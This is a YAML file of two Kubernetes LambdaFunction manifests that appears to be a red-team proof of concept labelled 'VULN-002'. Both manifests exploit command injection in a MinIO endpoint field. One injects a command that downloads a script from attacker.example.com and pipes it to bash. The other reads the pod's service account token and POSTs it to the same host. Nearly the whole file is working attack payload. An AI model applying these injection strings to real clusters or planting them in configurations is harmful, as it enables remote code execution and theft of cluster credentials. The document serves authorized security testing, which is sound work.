# VULN-002: Command Injection via MinIO Endpoint
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit injects shell commands via the MinIO endpoint field.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-002-minio-endpoint-injection
  labels:
    redteam: "true"
    exploit: "vuln-002"
    target: "minio-endpoint"
  annotations:
    redteam.knative.io/description: "Command injection via MinIO endpoint"
spec:
  source:
    type: minio
    minio:
      # Injection in endpoint field
      # Rendered: mc alias set source http://minio.minio.svc; curl http://attacker.example.com/shell.sh | bash # ...
      endpoint: "minio.minio.svc; curl http://attacker.example.com/shell.sh | bash #"
      bucket: "lambda-source"
      key: "functions/hello/code.zip"
      credentialsSecret: "minio-credentials"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-002-minio-endpoint-token
  labels:
    redteam: "true"
    exploit: "vuln-002"
    target: "minio-endpoint-token"
  annotations:
    redteam.knative.io/description: "Exfiltrate SA token via MinIO endpoint injection"
spec:
  source:
    type: minio
    minio:
      # Exfiltrate service account token
      endpoint: "x; cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl -X POST -d @- http://attacker.example.com/token #"
      bucket: "lambda-source"
      key: "functions/hello/code.zip"
      credentialsSecret: "minio-credentials"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
